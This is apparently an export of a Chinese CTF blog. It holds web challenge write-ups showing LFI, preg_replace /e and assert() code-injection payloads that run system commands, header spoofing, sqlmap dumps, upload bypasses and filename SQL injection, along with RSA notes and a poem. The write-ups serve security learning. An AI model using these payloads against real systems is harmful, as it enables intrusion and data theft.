**本地文件包含漏洞（LFI漏洞）的黑盒判断方法：单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞:主要涉及到的函数：include(),require()、include_once(),require_once()magic_quotes_gpc()、allow_url_fopen()、allow_url_include()、move_uploaded_file() 、readfile() file()、and file_get_contents()、upload_tmp_dir()、post_max_size()、and max_input_time()等典型漏洞代码：&lt;!–?php include($_GET[‘pages’].‘.php’); ?–&gt;参考文章：https://blog.csdn.net/qq_29419013/article/details/81202358**尝试读取index.php的页面源码，通过php内置协议直接读取代码：?page=php://filter/read=convert.base64-encode/resource=index.php得到很长一串base64编码，解码得到源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140&lt;?phperror_reporting(0);@session_start();posix_setuid(1000);?&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"renderer\" content=\"webkit\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\"&gt; &lt;link rel=\"stylesheet\" href=\"layui/css/layui.css\" media=\"all\"&gt; &lt;title&gt;设备维护中心&lt;/title&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;ul class=\"layui-nav\"&gt; &lt;li class=\"layui-nav-item layui-this\"&gt;&lt;a href=\"?page=index\"&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;fieldset class=\"layui-elem-field layui-field-title\" style=\"margin-top: 30px;\"&gt; &lt;legend&gt;设备列表&lt;/legend&gt; &lt;/fieldset&gt; &lt;table class=\"layui-hide\" id=\"test\"&gt;&lt;/table&gt; &lt;script type=\"text/html\" id=\"switchTpl\"&gt; &lt;!-- 这里的 checked 的状态只是演示 --&gt; &lt;input type=\"checkbox\" name=\"sex\" value=\"&#123;&#123;d.id&#125;&#125;\" lay-skin=\"switch\" lay-text=\"开|关\" lay-filter=\"checkDemo\" &#123;&#123; d.id==1 0003 ? 'checked' : '' &#125;&#125;&gt; &lt;/script&gt; &lt;script src=\"layui/layui.js\" charset=\"utf-8\"&gt;&lt;/script&gt; &lt;script&gt; layui.use('table', function() &#123; var table = layui.table, form = layui.form; table.render(&#123; elem: '#test', url: '/somrthing.json', cellMinWidth: 80, cols: [ [ &#123; type: 'numbers' &#125;, &#123; type: 'checkbox' &#125;, &#123; field: 'id', title: 'ID', width: 100, unresize: true, sort: true &#125;, &#123; field: 'name', title: '设备名', templet: '#nameTpl' &#125;, &#123; field: 'area', title: '区域' &#125;, &#123; field: 'status', title: '维护状态', minWidth: 120, sort: true &#125;, &#123; field: 'check', title: '设备开关', width: 85, templet: '#switchTpl', unresize: true &#125; ] ], page: true &#125;); &#125;); &lt;/script&gt; &lt;script&gt; layui.use('element', function() &#123; var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块 //监听导航点击 element.on('nav(demo)', function(elem) &#123; //console.log(elem) layer.msg(elem.text()); &#125;); &#125;); &lt;/script&gt;&lt;?php$page = $_GET[page];if (isset($page)) &#123;if (ctype_alnum($page)) &#123;?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;else&#123;?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt; &lt;?php if (strpos($page, 'input') &gt; 0) &#123; die(); &#125; if (strpos($page, 'ta:text') &gt; 0) &#123; die(); &#125; if (strpos($page, 'text') &gt; 0) &#123; die(); &#125; if ($page === 'index.php') &#123; die('Ok'); &#125; include($page); die(); ?&gt; &lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;&#125;//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt;&lt;/body&gt;&lt;/html&gt; 源码审计，得到如下可能存在问题的关键部分： 123456789101112131415161718192021&lt;?php//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; 可以看到preg_replace函数（执行一个正则表达式的搜索和替换），可以利用preg_replace函数的命令执行漏洞在—/e模式下（即参数pattern输入为/e时）将replacement参数当作PHP代码执行（php5.5版本后已经废弃）；**关于preg_replace：https://www.php.net/manual/zh/function.preg-replace.php**先来测试一下，看能不能输出关于PHP配置的信息； 构造payload：/index.php?pat=/lww/e&amp;rep=phpinfo()&amp;sub=lww同时还得伪造X_FORWARDED_FOR=== ‘127.0.0.1’； 构造：验证成功！ 接下来尝试读取文件目录，利用system（）函数； 构造payload：/index.php?pat=/lww/e&amp;rep=system（“ls”）&amp;sub=lww cd查看s3chahahaDir文件system(“cd%20s3chahahaDir%26%26ls”): **%20url解释为空格、%26为&amp;** 得到flag文件，cd查看flag文件： 得到flag.php，使用cat查看内容： ics-06题目描述：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。 实际操作： 进入页面只有报表中心可以点击，有一个输入框，各种fuzzing，没成功，后来才知道直接爆破就行。。。 知识点补充：关于爆破 Lottery！题目分析：随便输入7个数字得到以下结果，并且每次的winning numbers都是不同的，应该为随机数；根据Claim Your Prize中的提示，需要花费$9990000才能买到flag，如果一直猜数字获得余额不太现实， 实际操作:用burpsuite对输入彩票数字验证过程抓包，得到api.php; 不过还是不太清楚怎么搞，看了下wp，说是git源码泄露：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 尝试访问： 可以利用Githack提取下载源码；(但其实本题直接在附件里给出了网站源码、滑稽.gif)打开之前下载好的源文件： 打开api.php文件，可以看到以下验证彩票数字代码： 123456789101112131415161718192021222324252627282930$win_numbers = random_win_nums(); $same_count = 0; for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125; &#125; switch ($same_count) &#123; case 2: $prize = 5; break; case 3: $prize = 20; break; case 4: $prize = 300; break; case 5: $prize = 1800; break; case 6: $prize = 200000; break; case 7: $prize = 5000000; break; default: $prize = 0; break; &#125; 可以看到，代码将用户输入的7个数与7个随机数比较，并且用的==(弱类型比较),因为json支持bool数据，所以我们可以直接用true来使==成立；改包： 发现已经获得$200000;多提交几余额就够了，buy-&gt;flag； NewsCenter题目分析：打开链接，出现如下页面：[N1]:(https://dev.tencent.com/u/Single-minded_T/p/Single-minded_T/git/raw/master/images/N1.PNG) 实际操作： 尝试是否为sql注入：抓包： 利用sqlmap,命令：sqlmap.py -r 1.txt –dbs 看到有一个news，命令：sqlmap.py -r 1.txt -D news –dump 得到flag！ Mfw题目分析：打开链接，几个目录都看了下，发现： 可能存在git源码泄露，尝试访问.git目录： 实际操作：利用Githack得到网站源码(直接将GitHack.py拖入cmd,输入执行命令)： 在GitHack目录下可以看到网站源码文件夹： 在flag.php中只有如下内容： 1234&lt;?php// TODO// $FLAG = '';?&gt; 是将flag.php中的内容注释了，不显在网页上。 在index.php中发现关键代码： 12345678910111213&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = \"home\";&#125;$file = \"templates/\" . $page . \".php\";// I heard '..' is dangerous!assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");// TODO: Make this look niceassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");?&gt; **assert()这个函数在php语言中是用来判断一个表达式是否成立。返回true or false; 1234567891011/*PHP官方文档是怎么解释的：assert — 检查一个断言是否为 FALSE PHP 5 bool assert ( mixed $assertion [, string $description ] ) PHP 7 bool assert ( mixed $assertion [, Throwable $exception ] ) assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。 这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。断言这个功能应该只被用来调试。 你应该用于完整性检查时测试条件是否始终应该为 TRUE，来指示某些程序错误，或者检查具体功能的存在（类似扩展函数或特定的系统限制和功能）。*/ 123die() 函数输出一条消息，并退出当前脚本；strpos(string,find,start)查找find在字符串string中第一次出现的位置;file_exists() 函数检查文件或目录是否存在。如果指定的文件或目录存在则返回 TRUE，否则返回 FALSE。 **如此这般，可以利用assert()函数执行命令，类似sql注入，在数据库中查找，构造url为page=abc’) or system(“cat templates/flag.php”);//{用lww’)闭合前半部分，得到false；之后执行system();//注释掉后面的代码； Training-WWW-Robots知识点补充： robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。 当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。 如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。 Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。(摘自百度百科) 实际操作： 访问robots.txt，发现不允许访问fl0g.php 尝试访问/fl0g.php，得到flag； NaNNaNNaNNaN-Batman题目分析：下载附件，得到web100的文本，打开是乱码，大概看了下，将后缀改为HTML，在浏览器里打开，得到一个OK输入框； 但是输入没有任何响应；回头再看看代码； 可以很明显看到,’’是一个变量，而它的内容就是后面一长串字符(三行绿色部分即’’中间部分)；最后eval()函数执行_; **eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。**此处，eval()并未执行$()函数，而是执行了字符串，导致乱码?:).为了能看到正常源码，将eval()改为alert()； **alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。alert是HTML DOM 中用到的一种脚本语言，它的中文意思是“提醒”。它是JavaScript或VBscript脚本语言中窗口window对象的一个常用方法；其主要用法就是在你自己定义了一定的函数以后，通过执行相应的操作，所弹出对话框的语言。并且alert对话框通常用于一些对用户的提示信息。| alert(message) | || :————: | :——————————————————–: || 参数 | 描述 || message | 要在 window 上弹出的对话框中显示的纯文本（而非 HTML 文本） |** 即： 1234567891011121314151617181920212223function $()&#123; var e=document.getElementById(\"c\").value; if(e.length==16) if(e.match(/^be0f23/)!=null) if(e.match(/233ac/)!=null) if(e.match(/e98aa$/)!=null) if(e.match(/c7be9/)!=null) &#123; var t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"]; var n=[\"a\",\"_h0l\",\"n\"]; var r=[\"g&#123;\",\"e\",\"_0\"]; var i=[\"it'\",\"_\",\"n\"]; var s=[t,n,r,i]; for(var o=0;o&lt;13;++o) &#123; document.write(s[o%4][0]);s[o%4].splice(0,1) &#125; &#125;&#125; document.write('&lt;input id=\"c\"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'); delete _ **match() 方法可在字符串内检索指定的值，或找到一个或多个正则表达式的匹配。splice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。(应该是从var后的几个值中挑选几个，组合得到flag)** 实际操作： 方法一：审计，变量e需要满足五个条件。长度为16；^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa,其它的只要匹配到就行，没有位置要求；所以可以构造出：e==be0f233ac7be98aa在OK输入框中输入可以得到flag； 方法二：由于程序已经固定只是在输入时需要检测是否匹配，那么可以直接省去输入匹配部分，直接执行关键组合flag部分；提取如下代码，在控制台执行： 123456789101112131415161718function $()&#123; var e=document.getElementById(\"c\").value; &#123; var t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"]; var n=[\"a\",\"_h0l\",\"n\"]; var r=[\"g&#123;\",\"e\",\"_0\"]; var i=[\"it'\",\"_\",\"n\"]; var s=[t,n,r,i]; for(var o=0;o&lt;13;++o) &#123; document.write(s[o%4][0]);s[o%4].splice(0,1) &#125; &#125;&#125; document.write('&lt;input id=\"c\"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'); delete _ bug题目分析：给出一个登录页面;首先随便注册一个用户； 登录； 发现只有Manage是不能普通用户使用的； 最后发现还有个Finpwd，找回密码之前应该会验证身份，应该是突破口； 实际操作：先以smtsec找回密码，发现直接给了一个newpwd输入框；应该是需要抓包修改用户身份； 修改为admin，提示修改成功； 以admin身份登录成功；但是Manage还是不能使用提示IP not allowed!应该要改为本地登录；在请求头中加入X-Forwarded-For: 127.0.0.1进行ip伪造；得到如下页面； 查看源码，看到提示： 看到filemanage想到可能do为upload(文件管理无非上传、下载、查看、删除)； 关于文件上传：https://blog.csdn.net/qq_42636435/article/details/88096844 根据提示Just image？因该是上传image然后改后缀； 构造： 123&lt;？php phpinfo();？&gt; 上传发现，过滤了;不是php文件又不能进行解析得到响应；非php文件下提示要上传php文件；It is not a really php file这里尝试使用php的脚本表达形式 123&lt;script language='php'&gt;phpinfo();&lt;/script&gt; 将jpg后缀改为php4/php5;(否则不能解析)就得到响应flag了. upload初探 根据题目upload猜测可能为文件上传漏洞，先注册为会员(username:111111;password:111111); 登录就出现了上传文件的页面如下： 尝试上传文件，发现只有jpg格式的文件可以上传尝试上传php.jpg 1&lt;?php echo phpinfo();?&gt; burpsuite抓包改后缀名为php得到结果回应为文件格式错误，应该是服务器端的检查，而非客户端Js过滤； 分析：题目限制了上传文件的后缀名必须为jpg，但并没有对文件内容有所检查；图片马的方法不可行，上传成功后并没有目录，同时无法上传.htaccess对图片马解析； 参阅相关资料发现似乎是利用文件名注入，并且通过每次上传成功后的回显uid is ：1660 大概能够猜测应该是利用文件名对后端数据库进行注入；*后端插入语句： 12INSERT INTO 表名VALUES（被插入新行中的值） 实际操作： 构造payload：（文件名）1'+(select database())+'.jpg 可以看到select被过滤了，尝试双写绕过： 1'+(selselectect database())+'.jpg 页面回显均为0； 尝试转换格式：转为16进制：1'+(selselectect hex(database()))+'.jpg 页面回显为：7765625 分析(回显16进制为纯数字，可能过滤字母；且可能回显位不全)转10进制输出:1'+(selselectect conv(hex(database()),16,10))+'.jpg *MySQL CONV（）将一个数字从一个数字基数系统转换为另一个数字基数系统。转换后，函数返回数字的字符串表示形式。当定义的参数为NULL时，返回值将为NULL。最小基数为2，最大基数为36.如果要转换的基数为负数，则该数字被视为带符号数。否则，它被视为未签名。该函数出现在MySQL版本：5.6语法： 1CONV(N,from_base,to_base) 页面回显为：1.8446744073709552e19 分析(回显科学计数法，应该是输出位数过长)使用substr分割输出：1'+(selselectect conv(substr(hex(database()),1,12),16,10))+'.jpg 页面回显为：131277325825392 转16进制再转为ascll,得到：web_up123456789def changeascll(number): number=str(hex(number))[2:] s1=[number[i:(i+2)]for i in range(0,len(number),2)] s2=[int(i,16)for i in s1] s3=[chr(i)for i in s2] s=\"\".join(s3) print(s)changeascll(131277325825392) 提取后半部分字符：1819238756 1'+(selselectect conv(substr(hex(database()),13,12),16,10))+'.jpg 得到数据库名：web_upload 同样使用上述方法爆表payload：1'+(selecselectt conv(substr(hex((selecselectt table_name frofromm information_schema.tables where table_schema='web_upload' limit 1,1)),1,12),16,10))+'.jpg 114784820031327112615676665705126853610566245得到表名：hello_flag_is_here 爆字段payload:1'+(selecselectt conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name='hello_flag_is_here' limit 0,1)),1,12),16,10))+'.jpg 1158583773673987102823得到字段名：i_am_flag 爆值payload：1'+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg 3642721569519992806431727430560750951 得到值：1!!_@m_Th.e_F!lag web2题目分析：根据题目要求需要解密； 12345678910111213141516171819202122232425262728293031&lt;?php$miwen=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";function encode($str)&#123; $_o=strrev($str);//strrev() 函数反转字符串;语法:strrev(string) // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; $_c=substr($_o,$_0,1);//从$_0位置开始，返回1个字符//substr() 函数返回字符串的一部分。//注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。语法substr(string,start,length)//用于提取字符串的一部分，即返回字符串的子串。 $__=ord($_c)+1;//ord() 函数返回字符串的首个字符的 ASCII 值。 $_c=chr($__);//chr() 函数从指定的 ASCII 值返回字符。//ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。 $_=$_.$_c;//拼接 &#125; return str_rot13(strrev(base64_encode($_)));//返回ROT13 编码(反转字符串(base64加密($_)))的结果//ROT13一种简易的替换式密码&#125;highlight_file(__FILE__);/* 逆向加密算法，解密$miwen就是flag*/?&gt; 实际操作：分析代码，可知加密流程为： 对flag字符串反转 截取每一个字符，转ascll+1,再转为字符，拼接 base64加密，反转加密和的字符串，ROT13编码则可得解密算法：12345678910111213141516&lt;?php$str='a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';$_ = base64_decode(strrev(str_rot13($str)));$_o=NULL;for($_0=0;$_0&lt;strlen($_);$_0++)&#123; $_c=substr($_,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_o=$_o.$_c; &#125; echo strrev($_o);?&gt; php2题目分析：打开链接只有一句：Can you anthenticate to this website?尝试访问index.php，失败；访问index.phps,成功；得到以下源码： 12345678910111213&lt;?phpif(\"admin\"===$_GET[id]) &#123; echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"admin\")&#123; echo \"&lt;p&gt;Access granted!&lt;/p&gt;\"; echo \"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;\";&#125;?&gt; 分析代码： 要使”admin”===$_GET[id]不成立 $_GET[id] = urldecode($_GET[id]);url编码后使得$_GET[id] == “admin”成立 实际操作：方案：通过url转码实现，因为浏览器要转一次，故我们进行二次转码；n的url编码为：%6e;%的url编码为%25构造：admi%256e 1http://111.198.29.45:35463/?id=admi%256e","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"RSA算法分析","slug":"RSA算法分析","date":"2019-12-24T08:49:29.000Z","updated":"2019-12-24T09:17:40.535Z","comments":true,"path":"2019/12/24/RSA算法分析/","link":"","permalink":"https://singlemindedt.github.io/2019/12/24/RSA算法分析/","excerpt":"","text":"快速幂算法 加解密都用到了幂运算 1234567891011def FastMod(x, n, m): a = 1 b = x while True: temp = n if n % 2 == 1 : a = a * b % m b = b * b % m n = n//2 if temp &lt; 1 : return a 生成n位的素数产生的素数越大，安全性越好 1234567891011def genPrime(b=1024): while True: # the highest bit is 1 ans = \"1\" for i in range(b-2): ans += str(random.randint(0,1)) # the lowest bit is 1 ans += \"1\" ans = int(ans,2) if miller_rabin(ans): return ans","categories":[],"tags":[]},{"title":"安装gmpy2","slug":"安装gmpy2","date":"2019-12-23T03:44:56.000Z","updated":"2019-12-23T23:40:15.006Z","comments":true,"path":"2019/12/23/安装gmpy2/","link":"","permalink":"https://singlemindedt.github.io/2019/12/23/安装gmpy2/","excerpt":"","text":"在Windows上安装需要非官方的预编译二进制文件，网址：https://www.lfd.uci.edu/~gohlke/pythonlibs/找GMPY，是按照字母序排的，选择适合自己版本的gmpy2的whl文件进行下载，我选的：gmpy2‑2.0.8‑cp38‑cp38‑win_amd64.whl保存在了E盘，安装： PyCharm读取本地包：右击pycharm中项目管理器中本项目目录下的venv文件夹，单击在资源管理器中打开；用记事本打开pyvenv.cfg，将里面的include-system-site-packages = false改为include-system-site-packages = true；重启； 本项目有效，其它还得改pyvenv.cfg","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"},{"name":"Python","slug":"notes/Python","permalink":"https://singlemindedt.github.io/categories/notes/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://singlemindedt.github.io/tags/Python/"}]},{"title":"php2","slug":"php2","date":"2019-12-21T02:51:21.000Z","updated":"2019-12-30T06:10:07.045Z","comments":true,"path":"2019/12/21/php2/","link":"","permalink":"https://singlemindedt.github.io/2019/12/21/php2/","excerpt":"","text":"php2题目分析：打开链接只有一句：Can you anthenticate to this website?尝试访问index.php，失败；访问index.phps,成功；得到以下源码： 12345678910111213&lt;?phpif(\"admin\"===$_GET[id]) &#123; echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"admin\")&#123; echo \"&lt;p&gt;Access granted!&lt;/p&gt;\"; echo \"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;\";&#125;?&gt; 分析代码： 要使”admin”===$_GET[id]不成立 $_GET[id] = urldecode($_GET[id]);url编码后使得$_GET[id] == “admin”成立 实际操作：方案：通过url转码实现，因为浏览器要转一次，故我们进行二次转码；n的url编码为：%6e;%的url编码为%25构造：admi%256e 1http://111.198.29.45:35463/?id=admi%256e","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"web2","slug":"web2","date":"2019-12-21T01:44:24.000Z","updated":"2019-12-30T06:07:46.353Z","comments":true,"path":"2019/12/21/web2/","link":"","permalink":"https://singlemindedt.github.io/2019/12/21/web2/","excerpt":"","text":"web2题目分析：根据题目要求需要解密； 12345678910111213141516171819202122232425262728293031&lt;?php$miwen=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";function encode($str)&#123; $_o=strrev($str);//strrev() 函数反转字符串;语法:strrev(string) // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; $_c=substr($_o,$_0,1);//从$_0位置开始，返回1个字符//substr() 函数返回字符串的一部分。//注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。语法substr(string,start,length)//用于提取字符串的一部分，即返回字符串的子串。 $__=ord($_c)+1;//ord() 函数返回字符串的首个字符的 ASCII 值。 $_c=chr($__);//chr() 函数从指定的 ASCII 值返回字符。//ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。 $_=$_.$_c;//拼接 &#125; return str_rot13(strrev(base64_encode($_)));//返回ROT13 编码(反转字符串(base64加密($_)))的结果//ROT13一种简易的替换式密码&#125;highlight_file(__FILE__);/* 逆向加密算法，解密$miwen就是flag*/?&gt; 实际操作：分析代码，可知加密流程为： 对flag字符串反转 截取每一个字符，转ascll+1,再转为字符，拼接 base64加密，反转加密和的字符串，ROT13编码则可得解密算法：12345678910111213141516&lt;?php$str='a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';$_ = base64_decode(strrev(str_rot13($str)));$_o=NULL;for($_0=0;$_0&lt;strlen($_);$_0++)&#123; $_c=substr($_,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_o=$_o.$_c; &#125; echo strrev($_o);?&gt;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"不可征服","slug":"不可征服","date":"2019-12-20T13:38:09.000Z","updated":"2019-12-20T14:20:49.046Z","comments":true,"path":"2019/12/20/不可征服/","link":"","permalink":"https://singlemindedt.github.io/2019/12/20/不可征服/","excerpt":"","text":"《不可征服》 作者：威廉亨利 透过覆盖我的夜色, 我看见黑暗层层叠叠。 我感谢上天赐予我, 不可征服的灵魂。 就算被地狱紧紧拽住, 我也从未退避哀求。 遭受命运的重重打击， 我满头鲜血，却头颅高昂。 在愤怒和悲伤的尘世外, 耸立的不过是恐怖的影子, 面对未来的威胁, 我无所畏惧。 无论命运之门多么狭窄， 无论承受怎样的惩罚， 我是我命运的主宰, 我是我灵魂的统帅。 Invictus Out of the night that covers me Black as the pit from pole to pole I thank whatever gods may be For my unconquerable soul In the fell clutch of circumstance I have not winced nor cried aloud Under the bludgeonings of chance My head is bloody,but unbowed. Beyond this place of wrath and tear Looms but the Horror of the shade And yet the menace of the years Finds,and shall find,me unafraid It matters not how strait the gate How charged with punishments the scroll I am the master of my fate I am the captain of my soul.","categories":[{"name":"essay","slug":"essay","permalink":"https://singlemindedt.github.io/categories/essay/"}],"tags":[{"name":"essay","slug":"essay","permalink":"https://singlemindedt.github.io/tags/essay/"}]},{"title":"公钥密码体制","slug":"公钥密码体制","date":"2019-12-19T08:15:45.000Z","updated":"2020-01-01T16:44:00.645Z","comments":true,"path":"2019/12/19/公钥密码体制/","link":"","permalink":"https://singlemindedt.github.io/2019/12/19/公钥密码体制/","excerpt":"","text":"原因对称加密体制的不足： 密钥的分配和管理 签名和认证 公钥加密体制1.发送方A查找接收方B的公钥 A采用公钥加密算法以B的公钥加密明文消息 A通过不安全信道将密文发送给B B收到密文后用自己的私钥解密获取明文 关键：单向陷门函数单向陷门函数𝒇： 给出𝑓定义域中的任意元素𝑥,计算𝑓(𝑥)是容易的 给出𝑦=𝑓(𝑥)中的𝑦，计算𝑥： 若知道设计函数𝑓时结合进去的某种信息（称为陷门），则𝑥容易计算； 若不知道该陷门信息，则𝑥难以计算一个公钥密码应满足： 解密算法D与加密算法E互逆，即对于所有明文𝑀都有，𝑫(𝑬(𝑴,𝑲𝒆),𝑲𝒅)＝𝑴 由𝐾𝑒求出𝐾𝑑在计算上不可行 算法E和D都是高效的 RSA安全性基于大整数因子分解的困难性 RSA算法描述 例子 素数的生成一般的，选取一个素数的过程如下： 随机选一个奇数𝑛(如使用伪随机数产生器) 用某种概率性算法（如Miller-Rabin算法）对n进行一次素性检验，如果𝑛没有通过检验，转到步骤1 重复步骤2足够多次，如果𝑛都通过了检测，则认为𝑛为素数RSA的实现 例子 RSA的安全性 保密p,q已知p,q,由Euler函数φ(𝑛)=(𝑝−1)(𝑞−1)，也就可以利用欧几里得除法，根据𝑒𝑑≡1 (𝑚𝑜𝑑 φ(𝑛)), 由𝑒求出𝑑 依赖于大数分解问题 对RSA的攻击* 针对𝒏分解的攻击 循环攻击 同模攻击 选择密文攻击 低加密指数攻击 时间攻击 使用RSA体制时必须注意问题： 选择素数𝑝和𝑞时，应使其欧拉函数φ(𝑝)和φ(𝑞)的最小公倍数尽可能大(φ(𝒑)和φ(𝒒) 有大的素因子)。最小公倍数越大，幂剩余函数的周期就越长—避免循环攻击 密钥中的各项参数应选得足够大—避免穷举攻击 在同一个通信网络中，不同的用户不应该使用共同的模数n—避免同模攻击 公钥密码体制ElGamal基于离散对数问题 算法描述1.密钥生成选取大素数𝑝，𝑔∈〖𝑍_𝑝〗^∗是一个生成元，𝑝,𝑔 作为系统参数所有用户共享 系统中每个用户U都随机挑选整数𝑥，2≤𝑥≤ 𝑝－2，并计算： 𝑦=𝑔^𝑥(𝑚𝑜𝑑 𝑝)， 𝑦作为用户U的公钥，而𝑥作为用户U的私钥 2.加密 用户A先把明文𝑀编码为一个在 0 到𝑝－1之间的整数𝑚； 用户A挑选一个秘密随机数 𝑟 ( 2≤ 𝑟 ≤ 𝑝－2 )，并计算：𝑐1＝ 